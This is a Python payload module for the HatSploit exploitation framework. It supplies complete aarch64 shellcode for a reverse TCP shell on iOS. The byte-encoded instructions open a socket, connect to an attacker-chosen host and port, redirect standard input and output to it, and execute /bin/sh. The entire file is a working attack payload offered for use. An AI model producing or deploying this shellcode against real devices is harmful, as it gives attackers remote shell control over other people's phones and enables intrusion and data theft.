#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload


class HatSploitPayload(Payload):
    details = {
        'Category': "stager",
        'Name': "iOS aarch64 Shell Reverse TCP",
        'Payload': "apple_ios/aarch64/shell_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Shell reverse TCP payload for iOS aarch64.",
        'Architecture': "aarch64",
        'Platform': "apple_ios",
        'Rank': "high",
        'Type': "reverse_tcp"
    }

    def run(self):
        remote_host = self.handler['RHOST']
        remote_port = self.handler['RPORT']

        return (
            b"\x40\x00\x80\xd2"       # mov x0, #0x2
            b"\x21\x00\x80\xd2"       # mov x1, #0x1
            b"\x02\x00\x80\xd2"       # mov x2, #0x0
            b"\x30\x0c\x80\xd2"       # mov x16, #0x61
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\xe3\x03\x00\xaa"       # mov x3, x0
            b"\x41\x03\x00\x10"       # adr x1, 80 <sockaddr>
            b"\x02\x02\x80\xd2"       # mov x2, #0x10
            b"\x50\x0c\x80\xd2"       # mov x16, #0x62
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x60\x02\x00\x35"       # cbnz w0, 74 <exit>
            b"\xe0\x03\x03\xaa"       # mov x0, x3
            b"\x02\x00\x80\xd2"       # mov x2, #0x0
            b"\x01\x00\x80\xd2"       # mov x1, #0x0
            b"\x50\x0b\x80\xd2"       # mov x16, #0x5a
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x21\x00\x80\xd2"       # mov x1, #0x1
            b"\x50\x0b\x80\xd2"       # mov x16, #0x5a
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x41\x00\x80\xd2"       # mov x1, #0x2
            b"\x50\x0b\x80\xd2"       # mov x16, #0x5a
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x80\x01\x00\x10"       # adr x0, 88 <shell>
            b"\x02\x00\x80\xd2"       # mov x2, #0x0
            b"\xe0\x03\x00\xf9"       # str x0, [sp]
            b"\xe2\x07\x00\xf9"       # str x2, [sp, #8]
            b"\xe1\x03\x00\x91"       # mov x1, sp
            b"\x70\x07\x80\xd2"       # mov x16, #0x3b
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x00\x00\x80\xd2"       # mov x0, #0x0
            b"\x30\x00\x80\xd2"       # mov x16, #0x1
            b"\x01\x00\x00\xd4"       # svc #0x0
            b"\x02\x00:rport:port:"  # port
            b":rhost:ip:"            # host
            b"\x2f\x62\x69\x6e"
            b"\x2f\x73\x68\x00"
            b"\x00\x00\x00\x00"
            b"\x00\x00\x00\x00"
        ), {
            'rhost': remote_host,
            'rport': remote_port
        }
